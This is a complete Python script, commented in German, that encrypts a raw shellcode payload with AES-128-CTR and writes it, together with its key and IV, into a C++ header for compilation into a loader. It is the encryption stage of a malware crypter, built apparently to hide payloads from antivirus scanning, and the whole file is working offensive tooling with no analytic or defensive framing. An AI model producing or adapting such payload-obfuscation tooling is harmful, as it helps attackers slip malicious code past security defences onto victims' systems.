import os
import argparse
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import binascii

def create_header(payload_file, header_file):
    print(f"[*] Processing {payload_file} into {header_file}...")

    # 1. Lese den rohen Shellcode
    try:
        with open(payload_file, 'rb') as f:
            shellcode = f.read()
    except FileNotFoundError:
        print(f"[!] ERROR: Payload file not found: {payload_file}")
        return

    # 2. Generiere zufälligen AES Schlüssel und IV (wird als Counter für CTR verwendet)
    key = get_random_bytes(16)
    iv = get_random_bytes(16) # Wird als initialer Zählerwert verwendet
    cipher = AES.new(key, AES.MODE_CTR, initial_value=iv, nonce=b'')

    # 3. Verschlüssele den Shellcode
    encrypted_shellcode = cipher.encrypt(shellcode)

    # 4. Formatiere die Daten für die C++ Header-Datei
    def to_hex_array(data):
        return ', '.join([f'0x{byte:02x}' for byte in data])

    key_hex = to_hex_array(key)
    iv_hex = to_hex_array(iv)
    shellcode_hex = to_hex_array(encrypted_shellcode)

    # 5. Schreibe die Header-Datei
    with open(header_file, 'w') as f:
        f.write("#pragma once\n\n")
        f.write("#include <vector>\n\n")
        f.write(f"// HINWEIS: Der Payload ist mit AES-128-CTR verschlüsselt.\n")
        f.write(f"const std::vector<unsigned char> key_data = {{ {key_hex} }};\n")
        f.write(f"const std::vector<unsigned char> iv_data = {{ {iv_hex} }};\n")
        f.write(f"const std::vector<unsigned char> payload_data = {{ {shellcode_hex} }};\n")

    print("[+] Header file generated successfully with AES-CTR encryption.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Convert binary payload to encrypted C++ header.")
    parser.add_argument("payload", help="Path to the input binary payload file.")
    parser.add_argument("header", help="Path to the output C++ header file.")
    args = parser.parse_args()

    # Stelle sicher, dass die Krypto-Bibliothek installiert ist
    try:
        from Crypto.Cipher import AES
    except ImportError:
        print("[!] ERROR: PyCryptodome is not installed. Please run 'pip install pycryptodome'.")
    else:
        create_header(args.payload, args.header) 